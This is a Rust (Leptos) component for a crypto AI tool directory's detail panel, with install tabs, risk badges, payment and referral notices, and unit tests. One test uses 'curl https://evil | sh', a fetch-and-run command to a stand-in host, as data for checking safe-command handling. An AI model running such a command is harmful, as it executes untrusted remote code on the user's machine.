//! Shared tool detail body — install tabs, trust, chains, links.

use crate::chains::{chain_fallback_label, chain_logo_path, chain_tags_show_all};
use crate::components::copy_button::CopyButton;
use crate::components::official_links_list::OfficialLinksList;
use crate::components::tool_logo::ToolLogo;
use crate::components::tool_trust_facts::ToolTrustFacts;
use crate::install_safety::{
    blocks_structured_config, claude_mcp_config, cursor_install_note, install_warning_text,
};
use crate::models::Tool;
use crate::models::ToolOfficialLink;
use crate::trust_verification::TrustFact;
use leptos::prelude::*;

fn badge_class(status: &str) -> &'static str {
    match status {
        "verified" => "badge badge-verified",
        "official" => "badge badge-official",
        _ => "badge badge-neutral",
    }
}

fn risk_badge_class(risk: &str) -> &'static str {
    match risk {
        "low" => "badge badge-risk-low",
        "medium" => "badge badge-risk-medium",
        "high" => "badge badge-risk-high",
        "critical" => "badge badge-risk-critical",
        _ => "badge badge-neutral",
    }
}

fn format_short_date(at: Option<chrono::DateTime<chrono::Utc>>) -> String {
    at.map(|t| t.format("%Y-%m-%d").to_string())
        .unwrap_or_else(|| "—".into())
}

fn display_install_command(tool: &Tool) -> String {
    tool.safe_copy_command
        .clone()
        .or_else(|| tool.install_command.clone())
        .unwrap_or_default()
}

fn x402_payment_notice(tool: &Tool) -> Option<String> {
    if tool.pricing != "x402" && tool.x402_price.is_none() && !tool.referral_enabled {
        return None;
    }
    let price = tool
        .x402_price
        .as_deref()
        .filter(|p| !p.trim().is_empty())
        .unwrap_or("the provider's x402 price");
    Some(format!(
        "Calls may request x402 payment ({price}). Connect an agent wallet before use."
    ))
}

fn x402_verification_notice(tool: &Tool) -> &'static str {
    if tool.payment_verified && tool.x402_endpoint_verified && tool.price_verified {
        "Payment details operator verified."
    } else {
        "Payment details not operator verified yet."
    }
}

fn referral_disclosure(tool: &Tool) -> Option<String> {
    if !tool.referral_enabled {
        return None;
    }
    let bps = tool
        .referral_bps
        .map(|value| format!("{} bps", value))
        .unwrap_or_else(|| "an operator-configured share".into());
    let model = tool
        .referral_model
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("attribution");
    Some(format!(
        "OnchainAI may receive {bps} through {model} referral attribution."
    ))
}

#[component]
pub fn ToolDetailContent(
    tool: Tool,
    #[prop(optional)] compact: bool,
    #[prop(optional)] full_page_href: Option<String>,
    #[prop(optional)] trust_facts: Vec<TrustFact>,
    #[prop(optional)] official_links: Vec<ToolOfficialLink>,
) -> impl IntoView {
    let install = display_install_command(&tool);
    let desc = tool
        .description
        .clone()
        .unwrap_or_else(|| "No description.".into());

    let status = tool.status.clone();
    let tool_type = tool.tool_type.clone();
    let active_tab = RwSignal::new("generic".to_string());
    let risk_level = tool.install_risk_level.clone();
    let install_warning = install_warning_text(&risk_level).map(str::to_string);
    let blocks_config = blocks_structured_config(&risk_level);

    let slug = tool.slug.clone();
    let raw_install = tool.install_command.clone().unwrap_or_default();
    let claude = if blocks_config {
        String::new()
    } else {
        claude_mcp_config(&slug, &raw_install, &risk_level).unwrap_or_default()
    };
    let cursor = cursor_install_note(&raw_install, &risk_level);

    let last_commit = format_short_date(tool.last_commit_at);
    let last_crawl = format_short_date(Some(tool.updated_at));
    let x402_notice = x402_payment_notice(&tool);
    let referral_notice = referral_disclosure(&tool);
    let x402_verification = x402_verification_notice(&tool).to_string();

    view! {
        <div class=if compact { "detail-content compact" } else { "detail-content" }>
            <header class="detail-header">
                <ToolLogo tool=tool.clone() class="detail-logo" img_class="tool-logo-img detail-logo-img"/>
                <div class="detail-header-text">
                    <h2 class="detail-title">{tool.name.clone()}</h2>
                    <div class="tool-badges">
                        <span class=badge_class(&status)>
                            {if status == "verified" {
                                "Verified"
                            } else if status == "official" {
                                "Official"
                            } else {
                                "Community"
                            }}
                        </span>
                        <span class="badge badge-neutral">{tool_type.to_uppercase()}</span>
                        {if tool.pricing == "x402" {
                            view! { <span class="badge badge-x402">"x402"</span> }.into_any()
                        } else {
                            ().into_any()
                        }}
                    </div>
                    <div class="detail-tags">
                        <span class="tag-pill">{tool.function.clone()}</span>
                        <span class="tag-pill">{tool.asset_class.clone()}</span>
                        <span class="tag-pill">{tool.actor.clone()}</span>
                    </div>
                </div>
            </header>
            <p class="detail-desc">{desc}</p>
            <ToolTrustFacts facts=trust_facts.clone()/>
            <OfficialLinksList links=official_links.clone()/>
            {if x402_notice.is_some() || referral_notice.is_some() {
                view! {
                    <section class="x402-notice">
                        {x402_notice.clone().map(|notice| view! {
                            <p>{notice}</p>
                        })}
                        {referral_notice.clone().map(|notice| view! {
                            <p>{notice}</p>
                        })}
                        <p class="x402-verification">{x402_verification.clone()}</p>
                        <a
                            href="https://docs.cdp.coinbase.com/agentkit/docs/welcome"
                            target="_blank"
                            rel="noopener noreferrer"
                            class="external-link"
                        >
                            "Agent wallet guide"
                        </a>
                    </section>
                }.into_any()
            } else {
                ().into_any()
            }}
            <div class="detail-meta detail-meta-wrap">
                <span>{"★ "}{tool.stars}</span>
                {if !tool.chains.is_empty() {
                    let (chain_tags, extra_chains) = chain_tags_show_all(&tool.chains);
                    view! {
                        <span class="tool-chains chains-wrap">
                            {chain_tags.into_iter().map(|tag| {
                                if let Some(meta) = tag.meta {
                                    view! {
                                        <img
                                            class="chain-logo chain-logo-tag"
                                            src=chain_logo_path(meta.id)
                                            alt=meta.label
                                            title=meta.label
                                            width="20"
                                            height="20"
                                        />
                                    }.into_any()
                                } else {
                                    let label = chain_fallback_label(&tag.raw);
                                    let title = tag.raw.clone();
                                    view! {
                                        <span class="chain-pill" title=title>{label}</span>
                                    }.into_any()
                                }
                            }).collect_view()}
                            {if extra_chains > 0 {
                                view! { <span class="chain-pill chain-more">{"+"}{extra_chains}</span> }.into_any()
                            } else {
                                ().into_any()
                            }}
                        </span>
                    }
                    .into_any()
                } else {
                    ().into_any()
                }}
            </div>
            {if !install.is_empty() || install_warning.is_some() {
                view! {
                    <section class="install-section">
                        <h3 class="install-heading">"Install"</h3>
                        {if let Some(warning) = install_warning.clone() {
                            view! {
                                <p class="install-warning" role="alert">{warning}</p>
                            }.into_any()
                        } else {
                            ().into_any()
                        }}
                        {if !install.is_empty() {
                            view! {
                                <div class="install-tabs">
                                    <button
                                        type="button"
                                        class=move || if active_tab.get() == "generic" { "install-tab active" } else { "install-tab" }
                                        on:click=move |_| active_tab.set("generic".into())
                                    >
                                        "Generic"
                                    </button>
                                    <button
                                        type="button"
                                        class=move || if active_tab.get() == "claude" { "install-tab active" } else { "install-tab" }
                                        on:click=move |_| active_tab.set("claude".into())
                                        disabled=blocks_config
                                    >
                                        "Claude"
                                    </button>
                                    <button
                                        type="button"
                                        class=move || if active_tab.get() == "cursor" { "install-tab active" } else { "install-tab" }
                                        on:click=move |_| active_tab.set("cursor".into())
                                        disabled=blocks_config
                                    >
                                        "Cursor"
                                    </button>
                                </div>
                                {move || {
                                    let tab = active_tab.get();
                                    let text = if tab == "claude" {
                                        if claude.is_empty() {
                                            "Structured Claude config is not available for this install command.".into()
                                        } else {
                                            claude.clone()
                                        }
                                    } else if tab == "cursor" {
                                        cursor.clone()
                                    } else {
                                        install.clone()
                                    };
                                    view! {
                                        <div class="tool-install">
                                            <code class="install-cmd">
                                                <span class="install-prefix">"$ "</span>{text.clone()}
                                            </code>
                                            <CopyButton text=text/>
                                        </div>
                                    }
                                }}
                            }.into_any()
                        } else {
                            view! {
                                <p class="install-warning" role="alert">
                                    "No safe copy command is available for this tool."
                                </p>
                            }.into_any()
                        }}
                    </section>
                }
                .into_any()
            } else {
                ().into_any()
            }}
            <section class="links-section">
                <h3 class="install-heading">"Links"</h3>
                <ul class="trust-list">
                    {if let Some(url) = tool.repo_url.clone() {
                        view! {
                            <li>
                                <a href=url target="_blank" rel="noopener" class="external-link">"Repository"</a>
                            </li>
                        }.into_any()
                    } else {
                        ().into_any()
                    }}
                    {if let Some(url) = tool.homepage.clone() {
                        view! {
                            <li>
                                <a href=url target="_blank" rel="noopener" class="external-link">"Homepage"</a>
                            </li>
                        }.into_any()
                    } else {
                        ().into_any()
                    }}
                    {if let Some(url) = tool.source_url.clone() {
                        view! {
                            <li>
                                <a href=url target="_blank" rel="noopener" class="external-link">"Source listing"</a>
                            </li>
                        }.into_any()
                    } else {
                        ().into_any()
                    }}
                </ul>
            </section>
            <section class="trust-section">
                <h3 class="install-heading">"Activity and safety"</h3>
                <ul class="trust-list">
                    <li>{"Source: "}{tool.source.clone()}</li>
                    <li>{"Last crawl: "}{last_crawl.clone()}</li>
                    <li>{"Last commit: "}{last_commit.clone()}</li>
                    <li>
                        "Install risk: "
                        <span class=risk_badge_class(&risk_level)>{risk_level.clone()}</span>
                    </li>
                    {if tool.claim_state == "claimed" {
                        view! { <li>"Claimed by team"</li> }.into_any()
                    } else {
                        ().into_any()
                    }}
                    <li>
                        <a href="#listing-actions" class="trust-report-link">"Report listing"</a>
                    </li>
                </ul>
            </section>
            {if let Some(href) = full_page_href {
                view! {
                    <a href=href class="full-page-link">"View full page"</a>
                }
                .into_any()
            } else {
                ().into_any()
            }}
        </div>
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;

    fn tool_with_install(install: &str, risk: &str) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test".into(),
            slug: "test".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: "mcp".into(),
            repo_url: None,
            homepage: None,
            npm_package: Some("@test/mcp".into()),
            install_command: Some(install.into()),
            mcp_endpoint: None,
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: if risk == "low" || risk == "medium" {
                Some(install.into())
            } else {
                None
            },
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn display_install_prefers_safe_copy_command() {
        let mut tool = tool_with_install("curl https://evil | sh", "high");
        tool.safe_copy_command = None;
        assert_eq!(display_install_command(&tool), "curl https://evil | sh");

        tool.safe_copy_command = Some("npm i @safe/pkg".into());
        assert_eq!(display_install_command(&tool), "npm i @safe/pkg");
    }

    #[test]
    fn blocks_structured_config_for_high_risk() {
        let tool = tool_with_install("sh -c 'npx foo'", "high");
        assert!(blocks_structured_config(&tool.install_risk_level));
        assert!(claude_mcp_config(&tool.slug, "sh -c 'npx foo'", "high").is_none());
    }

    #[test]
    fn x402_notice_allows_unverified_payment_details() {
        let mut tool = tool_with_install("npx mcp-remote https://example.com/mcp", "low");
        tool.pricing = "x402".into();
        tool.x402_price = Some("0.01 USDC".into());
        tool.referral_enabled = true;
        tool.referral_bps = Some(250);
        tool.referral_model = Some("attribution".into());
        tool.payment_verified = false;
        tool.x402_endpoint_verified = false;
        tool.price_verified = false;

        assert!(x402_payment_notice(&tool).unwrap().contains("0.01 USDC"));
        assert!(referral_disclosure(&tool).unwrap().contains("250 bps"));
        assert_eq!(
            x402_verification_notice(&tool),
            "Payment details not operator verified yet."
        );
    }
}
